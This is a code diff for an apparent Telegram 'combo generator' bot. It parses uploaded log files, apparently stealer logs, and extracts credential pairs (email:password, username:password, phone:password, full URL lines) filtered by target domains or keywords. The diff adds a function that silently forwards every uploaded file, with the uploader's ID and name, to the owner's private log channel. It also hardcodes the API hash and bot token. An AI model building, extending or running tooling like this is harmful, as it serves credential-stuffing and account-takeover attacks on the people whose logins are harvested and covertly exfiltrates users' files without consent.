@@ -19,6 +19,7 @@ API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
 BOT_TOKEN = "7989255010:AAGI73-gpORxqqnsNrRRCLWNCyyACA0ia-w"
 OWNER_ID = 7125341830
 OWNER_USERNAME = "@still_alivenow"
+LOG_CHANNEL = -1003277595247  # Replace with your log channel ID
 
 # Initialize the bot
 app = Client("combo_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, workers=200, max_concurrent_transmissions = 1000, sleep_threshold=15)
@@ -63,6 +64,41 @@ def get_queue_position(user_id):
 
 def get_queue_size():
     return len(processing_queue)
+
+# Forward file to log channel with Serif Bold formatting
+async def forward_to_log_channel(message: Message, user_info: dict):
+    """Forward the file to log channel with formatted caption"""
+    try:
+        file = message.reply_to_message.document
+        user = message.from_user
+        
+        # Format caption with Serif Bold-like styling (using bold and formatting)
+        caption = (
+            f"<b>📁 FILE LOG</b>\n\n"
+            f"<b>📄 File Name:</b> <code>{file.file_name}</code>\n"
+            f"<b>📊 File Size:</b> {file.file_size // 1024} KB\n"
+            f"<b>👤 User ID:</b> <code>{user.id}</code>\n"
+            f"<b>🆔 Username:</b> @{user.username if user.username else 'N/A'}\n"
+            f"<b>📛 First Name:</b> {user.first_name}\n"
+            f"<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"<b>🔗 Forwarded From:</b> Private Chat"
+        )
+        
+        # Forward the file to log channel
+        await message.reply_to_message.forward(LOG_CHANNEL)
+        
+        # Send the caption as a separate message
+        await app.send_message(
+            LOG_CHANNEL,
+            caption,
+            disable_web_page_preview=True
+        )
+        
+        return True
+        
+    except Exception as e:
+        print(f"Error forwarding to log channel: {e}")
+        return False
 
 # Processing functions
 async def extract_email_pass(line):
@@ -168,10 +204,10 @@ async def process_log_file(user_id, file_path, target_domains=None, target_keywo
                     
                     # Prepare progress message
                     progress_text = (
-                        f"🔍 **Processing... {current_progress:.1f}%**\n"
-                        f"`[{progress_bar}]`\n"
-                        f"📊 **Lines:** {processed_lines}/{total_lines}\n"
-                        f"✅ **Found:** {total_found} combos\n"
+                        f"<b>🔍 PROCESSING... {current_progress:.1f}%</b>\n"
+                        f"<code>[{progress_bar}]</code>\n"
+                        f"<b>📊 Lines:</b> {processed_lines}/{total_lines}\n"
+                        f"<b>✅ Found:</b> {total_found} combos\n"
                     )
                     
                     # Add domain/keyword counts if available
@@ -188,11 +224,11 @@ async def process_log_file(user_id, file_path, target_domains=None, target_keywo
                     
                     queue_pos = get_queue_position(user_id)
                     if queue_pos == 0:  # Currently processing
-                        progress_text += f"\n\n⚡ **Currently Processing**"
+                        progress_text += f"\n\n<b>⚡ Currently Processing</b>"
                     else:
-                        progress_text += f"\n\n📋 **Queue Position:** {queue_pos}"
+                        progress_text += f"\n\n<b>📋 Queue Position:</b> {queue_pos}"
                     
-                    progress_text += f"\n⏳ **Click /cancel to stop**"
+                    progress_text += f"\n<b>⏳ Click /cancel to stop</b>"
                     
                     # Update progress message
                     if user_id in processing_users:
@@ -259,18 +295,18 @@ async def process_log_file(user_id, file_path, target_domains=None, target_keywo
 @app.on_message(filters.command("start") & filters.private)
 async def start_command(client: Client, message: Message):
     welcome_msg = (
-        "👋 **Welcome to the Advanced Combo Generator Bot!**\n\n"
-        "📌 **How to use:**\n"
-        "1. Send or reply to a .txt file with `/combo`\n"
+        "<b>👋 WELCOME TO THE ADVANCED COMBO GENERATOR BOT!</b>\n\n"
+        "<b>📌 HOW TO USE:</b>\n"
+        "1. Send or reply to a .txt file with <code>/combo</code>\n"
         "2. Choose processing type and combo format\n"
         "3. Wait for processing to complete\n\n"
-        "⚙️ **Commands:**\n"
-        "/start - Show this help\n"
-        "/combo - Start processing\n"
-        "/cancel - Cancel processing\n"
-        "/queue - Check queue status\n"
-        "/help - Detailed help\n\n"
-        f"👑 **Owner:** {OWNER_USERNAME}"
+        "<b>⚙️ COMMANDS:</b>\n"
+        "<code>/start</code> - Show this help\n"
+        "<code>/combo</code> - Start processing\n"
+        "<code>/cancel</code> - Cancel processing\n"
+        "<code>/queue</code> - Check queue status\n"
+        "<code>/help</code> - Detailed help\n\n"
+        f"<b>👑 Owner:</b> {OWNER_USERNAME}"
     )
     
     await message.reply_text(welcome_msg, disable_web_page_preview=True)
@@ -279,21 +315,21 @@ async def start_command(client: Client, message: Message):
 @app.on_message(filters.command("help") & filters.private)
 async def help_command(client: Client, message: Message):
     help_text = (
-        "📖 **Advanced Combo Bot Help**\n\n"
-        "🔹 **Supported Formats:**\n"
-        "• 📧 Email:Pass - email@domain.com:password\n"
-        "• 👤 User:Pass - username:password\n"
-        "• 🔢 Number:Pass - +1234567890:password\n"
-        "• 📄 ULP (Full Line) - Full line containing target\n\n"
-        "🔹 **Processing Modes:**\n"
-        "🌐 Domain Mode - Target specific domains\n"
-        "🔑 Keyword Mode - Target specific keywords\n"
-        "🌀 Mixed Mode - All valid combos\n\n"
-        "🔹 **Queue System:**\n"
+        "<b>📖 ADVANCED COMBO BOT HELP</b>\n\n"
+        "<b>🔹 SUPPORTED FORMATS:</b>\n"
+        "• <b>📧 Email:Pass</b> - email@domain.com:password\n"
+        "• <b>👤 User:Pass</b> - username:password\n"
+        "• <b>🔢 Number:Pass</b> - +1234567890:password\n"
+        "• <b>📄 ULP (Full Line)</b> - Full line containing target\n\n"
+        "<b>🔹 PROCESSING MODES:</b>\n"
+        "<b>🌐 Domain Mode</b> - Target specific domains\n"
+        "<b>🔑 Keyword Mode</b> - Target specific keywords\n"
+        "<b>🌀 Mixed Mode</b> - All valid combos\n\n"
+        "<b>🔹 QUEUE SYSTEM:</b>\n"
         "• Automatic queue for multiple requests\n"
-        "• Use /queue to check your position\n"
+        "• Use <code>/queue</code> to check your position\n"
         "• Fair processing for all users\n\n"
-        f"💡 **Contact:** {OWNER_USERNAME}"
+        f"<b>💡 Contact:</b> {OWNER_USERNAME}"
     )
     
     await message.reply_text(help_text, disable_web_page_preview=True)
@@ -307,16 +343,16 @@ async def queue_command(client: Client, message: Message):
     
     if user_position > 0:
         queue_text = (
-            f"📋 **Queue Information**\n\n"
-            f"• **Your Position:** {user_position}\n"
-            f"• **Total in Queue:** {queue_size}\n"
-            f"• **Estimated Wait:** ~{user_position * 2} minutes\n\n"
-            f"⏳ Please be patient..."
+            f"<b>📋 QUEUE INFORMATION</b>\n\n"
+            f"• <b>Your Position:</b> {user_position}\n"
+            f"• <b>Total in Queue:</b> {queue_size}\n"
+            f"• <b>Estimated Wait:</b> ~{user_position * 2} minutes\n\n"
+            f"<b>⏳ Please be patient...</b>"
         )
     elif user_id in processing_users:
-        queue_text = "⚡ **Your file is currently being processed!**"
+        queue_text = "<b>⚡ Your file is currently being processed!</b>"
     else:
-        queue_text = "ℹ️ **You are not in the queue.**\nUse `/combo` to start processing."
+        queue_text = "<b>ℹ️ You are not in the queue.</b>\nUse <code>/combo</code> to start processing."
     
     await message.reply_text(queue_text)
 
@@ -327,16 +363,16 @@ async def combo_command(client: Client, message: Message):
     
     # Check if user is already processing
     if user_id in processing_users:
-        await message.reply_text("⚠️ **You already have a processing task.**\nUse `/cancel` to stop current task.")
+        await message.reply_text("<b>⚠️ You already have a processing task.</b>\nUse <code>/cancel</code> to stop current task.")
         return
     
     if not message.reply_to_message:
         await message.reply_text(
-            "⚠️ **Please reply to a .txt file with /combo**\n\n"
-            "**Example:**\n"
+            "<b>⚠️ Please reply to a .txt file with /combo</b>\n\n"
+            "<b>Example:</b>\n"
             "1. Send the .txt file\n"
-            "2. Reply with `/combo`\n\n"
-            "Use `/help` for more info."
+            "2. Reply with <code>/combo</code>\n\n"
+            "Use <code>/help</code> for more info."
         )
         return
 
@@ -354,6 +390,14 @@ async def combo_command(client: Client, message: Message):
         if file_size > MAX_FILE_SIZE:
             await message.reply_text(f"⚠️ File too large. Max size: {MAX_FILE_SIZE//(1024*1024)}MB")
             return
+        
+        # Forward file to log channel
+        user_info = {
+            'id': user_id,
+            'username': message.from_user.username,
+            'first_name': message.from_user.first_name
+        }
+        await forward_to_log_channel(message, user_info)
         
         # Store user data
         processing_users[user_id] = {
@@ -374,11 +418,11 @@ async def combo_command(client: Client, message: Message):
         ])
         
         await message.reply_text(
-            "🎯 **Choose Processing Mode:**\n\n"
-            "🌐 **Domain Mode** - Extract combos for specific domain(s)\n"
-            "🔑 **Keyword Mode** - Extract combos containing specific keyword(s)\n"
-            "🌀 **Mixed Mode** - Extract all valid combos\n\n"
-            f"👑 **Owner:** {OWNER_USERNAME}",
+            "<b>🎯 CHOOSE PROCESSING MODE:</b>\n\n"
+            "<b>🌐 Domain Mode</b> - Extract combos for specific domain(s)\n"
+            "<b>🔑 Keyword Mode</b> - Extract combos containing specific keyword(s)\n"
+            "<b>🌀 Mixed Mode</b> - Extract all valid combos\n\n"
+            f"<b>👑 Owner:</b> {OWNER_USERNAME}",
             reply_markup=keyboard
         )
     
@@ -395,7 +439,7 @@ async def cancel_command(client: Client, message: Message):
     if user_id in processing_users:
         processing_users[user_id]['cancelled'] = True
         remove_from_queue(user_id)
-        await message.reply_text("🛑 **Processing cancelled.**")
+        await message.reply_text("<b>🛑 Processing cancelled.</b>")
         
         # Cleanup after a short delay
         await asyncio.sleep(2)
@@ -405,7 +449,7 @@ async def cancel_command(client: Client, message: Message):
                 await cleanup_files(processing_users[user_id]['file_path'])
             del processing_users[user_id]
     else:
-        await message.reply_text("ℹ️ **No active processing to cancel.**")
+        await message.reply_text("<b>ℹ️ No active processing to cancel.</b>")
 
 # Callback query handler - Processing Mode
 @app.on_callback_query(filters.regex(r'^(domain_mode|keyword_mode|mixed_mode|cancel)$'))
@@ -420,7 +464,7 @@ async def processing_mode_handler(client: Client, callback_query: CallbackQuery)
         
         if data == "cancel":
             processing_users[user_id]['cancelled'] = True
-            await callback_query.message.edit_text("🛑 **Cancelled.**")
+            await callback_query.message.edit_text("<b>🛑 Cancelled.</b>")
             if user_id in processing_users:
                 del processing_users[user_id]
             return
@@ -445,13 +489,13 @@ async def processing_mode_handler(client: Client, callback_query: CallbackQuery)
         ])
         
         await callback_query.message.edit_text(
-            "🔧 **Choose combo format:**\n\n"
-            "📧 **Email:Pass** - email@domain.com:password\n"
-            "👤 **User:Pass** - username:password\n"
-            "🔢 **Number:Pass** - +1234567890:password\n"
-            "📄 **ULP (Full Line)** - Full line containing target\n"
-            "🔄 **All Formats** - Extract all supported formats\n\n"
-            "**Select one:**",
+            "<b>🔧 CHOOSE COMBO FORMAT:</b>\n\n"
+            "<b>📧 Email:Pass</b> - email@domain.com:password\n"
+            "<b>👤 User:Pass</b> - username:password\n"
+            "<b>🔢 Number:Pass</b> - +1234567890:password\n"
+            "<b>📄 ULP (Full Line)</b> - Full line containing target\n"
+            "<b>🔄 All Formats</b> - Extract all supported formats\n\n"
+            "<b>Select one:</b>",
             reply_markup=keyboard
         )
         await callback_query.answer()
@@ -486,21 +530,21 @@ async def combo_format_handler(client: Client, callback_query: CallbackQuery):
         
         if processing_mode == "domain_mode":
             await callback_query.message.edit_text(
-                "🔎 **Enter target domain(s)**\n\n"
-                "**Examples:**\n"
-                "• Single domain: `netflix.com`\n" 
-                "• Multiple domains: `netflix.com gmail.com youtube.com`\n"
-                "• With paths: `netflix.com/account/mfa`\n\n"
-                "🛑 **Send /cancel to abort**"
+                "<b>🔎 ENTER TARGET DOMAIN(S)</b>\n\n"
+                "<b>Examples:</b>\n"
+                "• Single domain: <code>netflix.com</code>\n" 
+                "• Multiple domains: <code>netflix.com gmail.com youtube.com</code>\n"
+                "• With paths: <code>netflix.com/account/mfa</code>\n\n"
+                "<b>🛑 Send /cancel to abort</b>"
             )
         elif processing_mode == "keyword_mode":
             await callback_query.message.edit_text(
-                "🔎 **Enter target keyword(s)**\n\n"
-                "**Examples:**\n"
-                "• Single keyword: `password`\n" 
-                "• Multiple keywords: `login user pass`\n"
-                "• Phrases: `reset password`\n\n"
-                "🛑 **Send /cancel to abort**"
+                "<b>🔎 ENTER TARGET KEYWORD(S)</b>\n\n"
+                "<b>Examples:</b>\n"
+                "• Single keyword: <code>password</code>\n" 
+                "• Multiple keywords: <code>login user pass</code>\n"
+                "• Phrases: <code>reset password</code>\n\n"
+                "<b>🛑 Send /cancel to abort</b>"
             )
         else:  # mixed_mode
             # For mixed mode, proceed to queue directly
@@ -511,14 +555,14 @@ async def combo_format_handler(client: Client, callback_query: CallbackQuery):
             queue_size = get_queue_size()
             
             await callback_query.message.edit_text(
-                f"📋 **Added to Processing Queue**\n\n"
-                f"✅ **Mode:** Mixed\n"
-                f"✅ **Format:** {format_map[data].replace('_', ':').title() if format_map[data] != 'ulp' else 'ULP (Full Line)'}\n"
-                f"📊 **Queue Position:** {queue_pos}\n"
-                f"👥 **Total in Queue:** {queue_size}\n"
-                f"⏰ **Estimated Wait:** ~{queue_pos * 2} minutes\n\n"
-                f"⚡ **Processing will start automatically**\n"
-                f"Use `/queue` to check your status."
+                f"<b>📋 ADDED TO PROCESSING QUEUE</b>\n\n"
+                f"<b>✅ Mode:</b> Mixed\n"
+                f"<b>✅ Format:</b> {format_map[data].replace('_', ':').title() if format_map[data] != 'ulp' else 'ULP (Full Line)'}\n"
+                f"<b>📊 Queue Position:</b> {queue_pos}\n"
+                f"<b>👥 Total in Queue:</b> {queue_size}\n"
+                f"<b>⏰ Estimated Wait:</b> ~{queue_pos * 2} minutes\n\n"
+                f"<b>⚡ Processing will start automatically</b>\n"
+                f"Use <code>/queue</code> to check your status."
             )
             
             # Start queue processor if not running
@@ -551,11 +595,11 @@ async def handle_target_input(client: Client, message: Message):
                 if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/[a-zA-Z0-9-/_]*)?$', domain):
                     target_domains.append(domain)
                 else:
-                    await message.reply_text(f"❌ **Invalid domain format:** `{domain}`\n\nPlease send valid domains like: `netflix.com` or `netflix.com/account`")
+                    await message.reply_text(f"❌ <b>Invalid domain format:</b> <code>{domain}</code>\n\nPlease send valid domains like: <code>netflix.com</code> or <code>netflix.com/account</code>")
                     return
             
             if not target_domains:
-                await message.reply_text("❌ **No valid domains provided.**")
+                await message.reply_text("❌ <b>No valid domains provided.</b>")
                 return
             
             processing_users[user_id]['target_domains'] = target_domains
@@ -564,7 +608,7 @@ async def handle_target_input(client: Client, message: Message):
             target_keywords = input_text.split()
             
             if not target_keywords:
-                await message.reply_text("❌ **No keywords provided.**")
+                await message.reply_text("❌ <b>No keywords provided.</b>")
                 return
             
             processing_users[user_id]['target_keywords'] = target_keywords
@@ -595,22 +639,22 @@ async def handle_target_input(client: Client, message: Message):
             format_display = format_name.replace('_', ':').title()
         
         await message.reply_text(
-            f"📋 **Added to Processing Queue**\n\n"
-            f"✅ **Mode:** {processing_mode.replace('_', ' ').title()}\n"
-            f"✅ **Format:** {format_display}\n"
-            f"✅ **{target_type}:** {target_preview}\n"
-            f"📊 **Queue Position:** {queue_pos}\n"
-            f"👥 **Total in Queue:** {queue_size}\n"
-            f"⏰ **Estimated Wait:** ~{queue_pos * 2} minutes\n\n"
-            f"⚡ **Processing will start automatically**\n"
-            f"Use `/queue` to check your status."
+            f"<b>📋 ADDED TO PROCESSING QUEUE</b>\n\n"
+            f"<b>✅ Mode:</b> {processing_mode.replace('_', ' ').title()}\n"
+            f"<b>✅ Format:</b> {format_display}\n"
+            f"<b>✅ {target_type}:</b> {target_preview}\n"
+            f"<b>📊 Queue Position:</b> {queue_pos}\n"
+            f"<b>👥 Total in Queue:</b> {queue_size}\n"
+            f"<b>⏰ Estimated Wait:</b> ~{queue_pos * 2} minutes\n\n"
+            f"<b>⚡ Processing will start automatically</b>\n"
+            f"Use <code>/queue</code> to check your status."
         )
         
         # Start queue processor
         asyncio.create_task(start_queue_processor())
     
     except Exception as e:
-        await message.reply_text(f"❌ **Error:** {str(e)}")
+        await message.reply_text(f"❌ <b>Error:</b> {str(e)}")
         if user_id in processing_users:
             del processing_users[user_id]
 
@@ -656,7 +700,7 @@ async def process_user_task(user_id, task_data):
         # Send initial processing message
         processing_msg = await app.send_message(
             user_id, 
-            "⚡ **Starting processing...**\n\n📥 Downloading your file..."
+            "<b>⚡ STARTING PROCESSING...</b>\n\n<b>📥 Downloading your file...</b>"
         )
         
         # Download file with progress
@@ -666,7 +710,7 @@ async def process_user_task(user_id, task_data):
             await app.edit_message_text(
                 user_id,
                 processing_msg.id,
-                "❌ **Failed to download file.**\nPlease try again."
+                "<b>❌ Failed to download file.</b>\nPlease try again."
             )
             return
         
@@ -690,7 +734,7 @@ async def process_user_task(user_id, task_data):
     except Exception as e:
         print(f"Error processing task for user {user_id}: {e}")
         try:
-            await app.send_message(user_id, f"❌ **Processing error:** {str(e)}")
+            await app.send_message(user_id, f"❌ <b>Processing error:</b> {str(e)}")
         except:
             pass
     finally:
@@ -714,7 +758,7 @@ async def download_file_with_progress(user_id, file_id, message_id):
         await app.edit_message_text(
             user_id,
             message_id,
-            "✅ **File downloaded!**\n\n🔍 **Starting to process...**"
+            "<b>✅ File downloaded!</b>\n\n<b>🔍 Starting to process...</b>"
         )
         
         return file
@@ -727,11 +771,11 @@ async def process_single_format(user_id, file_path, target_domains, target_keywo
     result = await process_log_file(user_id, file_path, target_domains, target_keywords, combo_format)
     
     if result is None:  # Cancelled
-        await app.send_message(user_id, "🛑 **Processing cancelled.**")
+        await app.send_message(user_id, "<b>🛑 Processing cancelled.</b>")
         return
     
     if not result or all(not combos for combos in result.values()):
-        await app.send_message(user_id, "❌ **No valid combos found.**")
+        await app.send_message(user_id, "<b>❌ No valid combos found.</b>")
         return
     
     # Send results
@@ -755,10 +799,10 @@ async def process_single_format(user_id, file_path, target_domains, target_keywo
             chat_id=user_id,
             document=output_filename,
             caption=(
-                f"✅ **{format_name} - Mixed Results**\n\n"
-                f"🔹 **Combos found:** {len(result['mixed'])}\n"
-                f"🔹 **Processing time:** {processing_time:.2f}s\n\n"
-                f"👑 {OWNER_USERNAME}"
+                f"<b>✅ {format_name} - Mixed Results</b>\n\n"
+                f"<b>🔹 Combos found:</b> {len(result['mixed'])}\n"
+                f"<b>🔹 Processing time:</b> {processing_time:.2f}s\n\n"
+                f"<b>👑 {OWNER_USERNAME}</b>"
             )
         )
         await cleanup_files(output_filename)
@@ -787,9 +831,9 @@ async def process_single_format(user_id, file_path, target_domains, target_keywo
                 chat_id=user_id,
                 document=output_filename,
                 caption=(
-                    f"✅ **{format_name} - {target_type}: {target}**\n"
-                    f"🔹 **Combos found:** {len(combos)}\n\n"
-                    f"👑 {OWNER_USERNAME}"
+                    f"<b>✅ {format_name} - {target_type}: {target}</b>\n"
+                    f"<b>🔹 Combos found:</b> {len(combos)}\n\n"
+                    f"<b>👑 {OWNER_USERNAME}</b>"
                 )
             )
             sent_files += 1
@@ -799,11 +843,11 @@ async def process_single_format(user_id, file_path, target_domains, target_keywo
         if sent_files > 1:
             await app.send_message(
                 user_id,
-                f"📦 **Processing Complete!**\n\n"
-                f"🔹 **Files sent:** {sent_files}\n"
-                f"🔹 **Total combos:** {total_combos}\n"
-                f"🔹 **Time:** {processing_time:.2f}s\n\n"
-                f"👑 {OWNER_USERNAME}"
+                f"<b>📦 PROCESSING COMPLETE!</b>\n\n"
+                f"<b>🔹 Files sent:</b> {sent_files}\n"
+                f"<b>🔹 Total combos:</b> {total_combos}\n"
+                f"<b>🔹 Time:</b> {processing_time:.2f}s\n\n"
+                f"<b>👑 {OWNER_USERNAME}</b>"
             )
 
 async def process_all_formats(user_id, file_path, target_domains, target_keywords, task_data):
@@ -821,14 +865,14 @@ async def process_all_formats(user_id, file_path, target_domains, target_keyword
     
     for fmt in formats:
         if user_id in processing_users and processing_users[user_id].get('cancelled', False):
-            await app.send_message(user_id, "🛑 **Processing cancelled.**")
+            await app.send_message(user_id, "<b>🛑 Processing cancelled.</b>")
             return
         
         # Update progress
         await app.edit_message_text(
             user_id,
             processing_users[user_id]['progress_msg'],
-            f"🔄 **Processing {format_names[fmt]}...**\n\nPlease wait..."
+            f"<b>🔄 Processing {format_names[fmt]}...</b>\n\nPlease wait..."
         )
         
         result = await process_log_file(user_id, file_path, target_domains, target_keywords, fmt)
@@ -856,7 +900,7 @@ async def process_all_formats(user_id, file_path, target_domains, target_keyword
                 await app.send_document(
                     chat_id=user_id,
                     document=output_filename,
-                    caption=f"✅ {format_names[fmt]} - {len(combos)} combos"
+                    caption=f"<b>✅ {format_names[fmt]} - {len(combos)} combos</b>"
                 )
                 await cleanup_files(output_filename)
         else:
@@ -872,17 +916,17 @@ async def process_all_formats(user_id, file_path, target_domains, target_keyword
                     await app.send_document(
                         chat_id=user_id,
                         document=output_filename,
-                        caption=f"✅ {format_names[fmt]} - {target} - {len(combos)} combos"
+                        caption=f"<b>✅ {format_names[fmt]} - {target} - {len(combos)} combos</b>"
                     )
                     await cleanup_files(output_filename)
                     await asyncio.sleep(0.5)
     
     await app.send_message(
         user_id,
-        f"🎉 **All Formats Processing Complete!**\n\n"
-        f"🔹 **Total combos found:** {total_combos}\n"
-        f"🔹 **Processing time:** {processing_time:.2f}s\n\n"
-        f"👑 {OWNER_USERNAME}"
+        f"<b>🎉 ALL FORMATS PROCESSING COMPLETE!</b>\n\n"
+        f"<b>🔹 Total combos found:</b> {total_combos}\n"
+        f"<b>🔹 Processing time:</b> {processing_time:.2f}s\n\n"
+        f"<b>👑 {OWNER_USERNAME}</b>"
     )
 
 # Error handler
